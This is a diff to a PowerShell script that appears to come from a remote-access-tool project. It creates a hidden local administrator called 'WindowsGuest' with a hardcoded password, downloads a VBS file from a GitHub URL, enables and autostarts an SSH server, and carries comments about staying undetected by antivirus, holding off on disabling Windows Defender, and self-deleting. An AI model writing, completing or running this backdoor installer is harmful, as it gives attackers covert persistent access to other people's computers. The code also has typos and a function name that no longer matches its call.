@@ -6,7 +6,7 @@ function random_text{
 }
 
 # create local admin
-function create_account {
+function Crreate-NewLocalAdmin {
     [CmdletBinding()]
     param (
         [string] $NewLocalAdmin,
@@ -36,7 +36,7 @@ cd $path
 # create admin user
 Remove-LocalUser -Name "WindowsGuest"
 $NewLocalAdmin = "WindowsGuest"
-$Password = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
+$Password = (ConvertTo-SecureString "rat123" -AsPlainText -Force)
 Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
 
 # create registery to hide local admin
@@ -49,7 +49,7 @@ $vbs_file = random_text
 Invoke-WebRequest -Uri raw.githubusercontent.com/tarasermolenko/RemoteAccessTool/blob/main/files/confirm.vbs -OutFile 
 "$vbs_file.vbs"
 
-./"$reg_file.reg";"$vsb_file.vbs"
+
 
 # dont disable wdef until need to, not av detectable up until here
 
@@ -58,6 +58,9 @@ Add-WindowsCapability -Online
 Start-Service sshd
 Set-Service -Name sshd
 -StartupTpe 'Automatic'
+
+# install the registery
+./"$reg_file.reg";"$vsb_file.vbs"
 
 # self delete
 # cd $initial_dir
